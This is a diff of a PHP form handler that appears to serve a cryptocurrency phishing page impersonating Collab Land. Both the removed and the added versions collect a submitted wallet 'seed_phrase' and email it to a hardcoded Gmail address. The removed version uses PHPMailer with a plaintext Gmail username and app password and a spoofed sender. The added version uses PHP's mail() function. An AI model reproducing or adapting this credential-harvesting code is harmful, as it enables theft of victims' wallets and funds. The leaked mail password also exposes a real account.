@@ -1,40 +1,25 @@
 <?php
-// PHPMailer
-require '../PHPMailer/PHPMailer.php';
-require '../PHPMailer/SMTP.php';
-require '../PHPMailer/Exception.php';
 
-if ($_POST['vendor'] == '' || $_POST['seed_phrase'] == '') {
-    echo json_encode(
-        array('nullError' => 'Please fill in all fields',)
-    );
+if (isset($_POST['vendor'])) {
+    ini_set('display_errors', '1');
+    error_reporting(E_ALL);
 
-    http_response_code(500);
-    return;
-} else {
-    $mail = new PHPMailer\PHPMailer\PHPMailer();
-    $mail->IsSMTP(); // enable SMTP
+    $from = 'admin@wale.com'; // Mail create from your cpanel
+    $to = "mail.mirolic@gmail.com"; // Receiver address
 
-    $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only // 0 - off (for production use, No debug messages)
-    $mail->SMTPAuth = true; // authentication enabled
-    $mail->SMTPSecure = 'tls'; // secure transfer enabled REQUIRED for Gmail
-    $mail->Host = "smtp.gmail.com";
-    $mail->Port = 587; // or 587
-    $mail->IsHTML(true);
-    $mail->Username = "lexicalpay@gmail.com";
-    $mail->Password = "iqcwkelyrwxymixh";
-    $mail->SetFrom('update@colab.land', 'Collab');
-    $mail->Subject = 'NEW UPDATE - ' . $_POST['vendor'];
-    $mail->Body = '<b>' . $_POST['vendor'] . '</b>' . '<br><br>' . $_POST['seed_phrase'];
-    $mail->AddAddress("mail.mirolic@gmail.com", "Collab Land");
+    $subject = "Mail From Wale";
+    $message = "You have received a new message from your website, " .
+        "Here is the TYPE: " . $_POST['vendor'] . "\n" .
+        "Here is the seed and phrase: " . $_POST['seed_phrase'] . "\n";
 
-    if (!($mail->Send())) {
-        echo json_encode(
-            array('networkError' => 'Network error, please try again.',)
-        );
 
-        http_response_code(500);
-    } else {
+    $headers = "From:" . $from;
+
+    if (mail($to, $subject, $message, $headers)) {
         http_response_code(200);
+    } else {
+        http_response_code(500);
     }
+} else {
+    http_response_code(404);
 }
